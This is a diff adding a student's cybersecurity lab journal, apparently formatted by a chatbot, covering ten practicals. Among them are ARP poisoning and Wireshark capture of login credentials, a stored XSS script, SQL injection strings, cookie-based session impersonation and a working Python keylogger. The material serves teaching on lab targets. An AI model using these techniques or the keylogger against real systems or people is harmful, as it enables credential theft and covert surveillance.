@@ -65,3 +65,179 @@
 <br>
 10 Using Metasploit to exploit (Kali Linux) <br>
 <br>
+
+
+<br>
+
+<p>Here&rsquo;s a cleaned-up and aligned version of all your cybersecurity practicals, formatted neatly and consistently for your journal:</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 1*</p>
+
+<p>### *AIM:* Use Google and Whois for Reconnaissance.</p>
+
+<p>#### Using WHO.IS</p>
+
+<p>*Step 1:* Open the [WHO.IS](https://who.is) website. <br>
+*Step 2:* Enter the domain name (e.g., www.prestashop.com) in the search bar and hit the *Enter* button. <br>
+*Step 3:* View the domain registration and ownership information.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 2*</p>
+
+<p>### *2.1) Use CryptTool to Encrypt and Decrypt Passwords Using RC4 Algorithm*</p>
+
+<p>*Step 1:* Open CryptTool. <br>
+*Step 2:* Choose RC4 algorithm for encryption. <br>
+*Encryption:* Enter the plaintext and key, and encrypt using RC4. <br>
+*Decryption:* Enter the cipher text and key, and decrypt using RC4.</p>
+
+<p>---</p>
+
+<p>### *2.2) Use Cain and Abel for Cracking Windows Passwords (Dictionary Attack) &amp; Wireless Network Passwords*</p>
+
+<p>*Step 1:* Click on *HASH Calculator*. <br>
+*Step 2:* Enter a password to generate its hash (e.g., MD5). <br>
+*Step 3:* Paste the hash into the cracking field. <br>
+*Step 4:* Right-click the hash &rarr; Select *Dictionary Attack*. <br>
+*Step 5:* Add Wordlist &rarr; Select all options &rarr; Start the attack.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 3*</p>
+
+<p>### *3.1) Using TraceRoute, Ping, Ifconfig, Netstat*</p>
+
+<p>*Step 1:* Open CMD and type:<br>
+- tracert www.prestashop.com<br>
+- ping [IP Address]<br>
+- ifconfig (or ipconfig in Windows)<br>
+- netstat</p>
+
+<p>### *3.2) Perform ARP Poisoning in Windows Using Cain &amp; Abel*</p>
+
+<p>*Step 1:* Open Cain &amp; Abel. <br>
+*Step 2:* Click *Sniffer* &rarr; Click *Start/Stop Sniffer* &rarr; Select device &rarr; OK. <br>
+*Step 3:* Click &ldquo;+&rdquo; &rarr; Connected hosts will be displayed. <br>
+*Step 4:* Go to *ARP tab* &rarr; Click &ldquo;+&rdquo; &rarr; Add targets. <br>
+*Step 5:* Click *Start/Stop ARP icon* to begin poisoning. <br>
+*Step 6:* Visit any site on the source device. <br>
+*Step 7:* Go to *Passwords tab* to view captured credentials.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 4*</p>
+
+<p>### *AIM:* Using Nmap Scanner to Perform Various Port Scans</p>
+
+<p>*Note:* Install Nmap &rarr; Open CMD &rarr; Type nmap to verify.</p>
+
+<p>*Commands:*<br>
+- *ACK Scan:* nmap -sA -T4 scanme.nmap.org<br>
+- *SYN Scan:* nmap -sS -p22,113,139 scanme.nmap.org<br>
+- *FIN Scan:* nmap -sF -T4 scanme.nmap.org<br>
+- *NULL Scan:* nmap -sN -p 22 scanme.nmap.org<br>
+- *XMAS Scan:* nmap -sX -T4 scanme.nmap.org</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 5*</p>
+
+<p>### *AIM:* Use Wireshark Sniffer to Capture and Analyze Network Traffic</p>
+
+<p>*Step 1:* Open Wireshark. <br>
+*Step 2:* Go to *Capture > Interfaces* &rarr; Select *Local Area Connection* &rarr; Click *Start*. <br>
+*Step 3:* Open a website and login with credentials. <br>
+*Step 4:* Filter traffic using http &rarr; Apply. <br>
+*Step 5:* Stop capture &rarr; Look for *POST* requests. <br>
+*Step 6:* Find captured *username and password* in plain text.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 6*</p>
+
+<p>### *AIM:* Simulate Persistent Cross-Site Scripting (XSS) Attack</p>
+
+<p>*Steps:*<br>
+- Open the vulnerable website (e.g., DVWA).<br>
+- Set security to *Low*.<br>
+- Go to *XSS (Stored)*.<br>
+- Inject a script like <script>alert(&quot;XSS&quot;)</script>.<br>
+- Submit and reload the page to see the alert.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 7*</p>
+
+<p>### *AIM:* Session Impersonation using Firefox and Tamper Data Add-on</p>
+
+<p>#### *A] Session Impersonation*</p>
+
+<p>*Step 1:* Install Firefox cookie tools (e.g., EditThisCookie). <br>
+*Step 2:* Login to a website &rarr; Export the session cookie. <br>
+*Step 3:* Logout &rarr; Paste and apply the cookie using the extension &rarr; Access is restored.</p>
+
+<p>#### *B] Tamper Data Add-on*</p>
+
+<p>*Step 1:* Install *Tamper Data*. <br>
+*Step 2:* Open a website &rarr; Add an item to cart &rarr; Start tampering. <br>
+*Step 3:* Modify values before submission &rarr; Proceed to checkout &rarr; View manipulated results.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 8*</p>
+
+<p>### *AIM:* Perform SQL Injection Attack</p>
+
+<p>*Step 1:* Open XAMPP &rarr; Start *Apache* and *MySQL*. <br>
+*Step 2:* Go to localhost/phpmyadmin &rarr; Create database sql_db. <br>
+*Step 3:* Open localhost/sql_injection/setup.php &rarr; Click *Create/Reset*. <br>
+*Step 4:* Go to login.php &rarr; Login using: admin and empty password. <br>
+*Step 5:* Set *Security Level: Low*. <br>
+*Step 6:* Try payloads in input box:<br>
+- &quot;1&quot;<br>
+- &quot;a' OR ''='&quot;<br>
+- &quot;1=1&quot;<br>
+- &quot;1*&quot;</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 9*</p>
+
+<p>### *AIM:* Create a Simple Keylogger using Python</p>
+
+<p>python<br>
+from pynput.keyboard import Key, Listener<br>
+import logging</p>
+
+<p>log_dir = &quot;&quot;</p>
+
+<p>logging.basicConfig(filename=(log_dir + &quot;key_log.txt&quot;), level=logging.DEBUG, format='%(asctime)s:%(message)s:')</p>
+
+<p>def on_press(key):<br>
+ logging.info(str(key))</p>
+
+<p>with Listener(on_press=on_press) as listener:<br>
+ listener.join()</p>
+
+<p>
+*Output:* Logs keystrokes in key_log.txt.</p>
+
+<p>---</p>
+
+<p>## &#9989; *PRACTICAL NO. 10*</p>
+
+<p>### *AIM:* Using Metasploit to Exploit a System</p>
+
+<p>*Steps:*<br>
+1. Download and open *Metasploit*.<br>
+2. Use search to find an exploit.<br>
+3. Use the command: use exploit/path.<br>
+4. Set required payload and options.<br>
+5. Deliver the exploit to the target system.</p>
+
+<p>---</p>
+
+<p>Let me know if you want this in a Word or PDF format, or need a title page and index added!</p>
